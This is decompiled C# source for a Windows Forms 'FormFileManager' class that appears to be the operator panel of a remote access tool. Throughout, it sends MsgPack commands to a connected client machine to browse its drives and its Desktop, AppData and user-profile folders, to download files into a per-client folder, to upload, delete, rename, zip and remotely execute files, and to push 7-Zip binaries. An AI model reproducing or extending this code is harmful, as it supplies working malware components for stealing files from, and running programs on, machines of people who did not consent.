using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x02000067 RID: 103
	public partial class FormFileManager : Form
	{
		// Token: 0x17000068 RID: 104
		// (get) Token: 0x0600022E RID: 558 RVA: 0x00019DAD File Offset: 0x00017FAD
		// (set) Token: 0x0600022F RID: 559 RVA: 0x00019DB5 File Offset: 0x00017FB5
		public Form1 F { get; set; }

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x06000230 RID: 560 RVA: 0x00019DBE File Offset: 0x00017FBE
		// (set) Token: 0x06000231 RID: 561 RVA: 0x00019DC6 File Offset: 0x00017FC6
		internal Clients Client { get; set; }

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x06000232 RID: 562 RVA: 0x00019DCF File Offset: 0x00017FCF
		// (set) Token: 0x06000233 RID: 563 RVA: 0x00019DD7 File Offset: 0x00017FD7
		public string FullPath { get; set; }

		// Token: 0x06000234 RID: 564 RVA: 0x00019DE0 File Offset: 0x00017FE0
		public FormFileManager()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000235 RID: 565 RVA: 0x00019DF0 File Offset: 0x00017FF0
		private void listView1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
					this.listView1.Enabled = false;
					this.toolStripStatusLabel3.ForeColor = Color.Green;
					this.toolStripStatusLabel3.Text = "Please Wait";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000236 RID: 566 RVA: 0x00019EC8 File Offset: 0x000180C8
		private void backToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				string text = this.toolStripStatusLabel1.Text;
				if (text.Length <= 3)
				{
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getDrivers";
					this.toolStripStatusLabel1.Text = "";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					text = text.Remove(text.LastIndexOfAny(new char[]
					{
						'\\'
					}, text.LastIndexOf('\\')));
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = text + "\\";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				this.toolStripStatusLabel1.Text = "";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
		}

		// Token: 0x06000237 RID: 567 RVA: 0x0001A040 File Offset: 0x00018240
		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
					{
						Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
					}
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex == 0 && listViewItem.ImageIndex == 1 && listViewItem.ImageIndex == 2)
						{
							break;
						}
						MsgPack msgPack = new MsgPack();
						string dwid = Guid.NewGuid().ToString();
						msgPack.ForcePathObject("Packet").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "socketDownload";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("DWID").AsString = dwid;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						base.BeginInvoke(new MethodInvoker(delegate()
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
							{
								new FormDownloadFile
								{
									Name = "socketDownload:" + dwid,
									Text = "socketDownload:" + this.Client.ID,
									F = this.F,
									DirPath = this.FullPath
								}.Show();
							}
						}));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000238 RID: 568 RVA: 0x0001A1FC File Offset: 0x000183FC
		private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.toolStripStatusLabel1.Text.Length >= 3)
			{
				try
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Multiselect = true;
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						foreach (string text in openFileDialog.FileNames)
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:"] == null)
							{
								FormDownloadFile formDownloadFile = new FormDownloadFile
								{
									Name = "socketUpload:" + Guid.NewGuid().ToString(),
									Text = "socketUpload:" + this.Client.ID,
									F = Program.form1,
									Client = this.Client
								};
								formDownloadFile.FileSize = new FileInfo(text).Length;
								formDownloadFile.labelfile.Text = Path.GetFileName(text);
								formDownloadFile.FullFileName = text;
								formDownloadFile.label1.Text = "Upload:";
								formDownloadFile.ClientFullFileName = this.toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
								MsgPack msgPack = new MsgPack();
								msgPack.ForcePathObject("Packet").AsString = "fileManager";
								msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
								msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
								formDownloadFile.Show();
								ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000239 RID: 569 RVA: 0x0001A3C4 File Offset: 0x000185C4
		private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex != 0 && listViewItem.ImageIndex != 1 && listViewItem.ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "deleteFile";
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (listViewItem.ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
							msgPack2.ForcePathObject("Folder").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600023A RID: 570 RVA: 0x0001A550 File Offset: 0x00018750
		private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.toolStripStatusLabel1.Text != "")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.toolStripStatusLabel1.Text;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "getDrivers";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600023B RID: 571 RVA: 0x0001A640 File Offset: 0x00018840
		private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "execute";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600023C RID: 572 RVA: 0x0001A724 File Offset: 0x00018924
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x0600023D RID: 573 RVA: 0x0001A764 File Offset: 0x00018964
		private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "DESKTOP";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600023E RID: 574 RVA: 0x0001A7E8 File Offset: 0x000189E8
		private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "APPDATA";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600023F RID: 575 RVA: 0x0001A86C File Offset: 0x00018A6C
		private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""), -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "createFolder";
					msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000240 RID: 576 RVA: 0x0001A92C File Offset: 0x00018B2C
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "copy";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000241 RID: 577 RVA: 0x0001AA44 File Offset: 0x00018C44
		private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "pasteFile";
				msgPack.ForcePathObject("File").AsString = this.toolStripStatusLabel1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000242 RID: 578 RVA: 0x0001AAD0 File Offset: 0x00018CD0
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count == 1)
			{
				try
				{
					string text = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text, -1, -1);
					if (!string.IsNullOrEmpty(text))
					{
						if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Packet").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "renameFile";
							msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
							msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (this.listView1.SelectedItems[0].ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Packet").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "renameFolder";
							msgPack2.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
							msgPack2.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000243 RID: 579 RVA: 0x0001ACF0 File Offset: 0x00018EF0
		private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "USER";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000244 RID: 580 RVA: 0x0001AD74 File Offset: 0x00018F74
		private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getDrivers";
			this.toolStripStatusLabel1.Text = "";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000245 RID: 581 RVA: 0x0001ADE0 File Offset: 0x00018FE0
		private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Process.Start(this.FullPath);
			}
			catch
			{
			}
		}

		// Token: 0x06000246 RID: 582 RVA: 0x0001AE28 File Offset: 0x00019028
		private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x06000247 RID: 583 RVA: 0x0001AE3C File Offset: 0x0001903C
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "cut";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000248 RID: 584 RVA: 0x0001AF54 File Offset: 0x00019154
		private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "zip";
					msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("Zip").AsString = "true";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000249 RID: 585 RVA: 0x0001B06C File Offset: 0x0001926C
		private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Packet").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "zip";
						msgPack.ForcePathObject("Path").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("Zip").AsString = "false";
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600024A RID: 586 RVA: 0x0001B168 File Offset: 0x00019368
		private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "installZip";
			msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
			msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}
	}
}
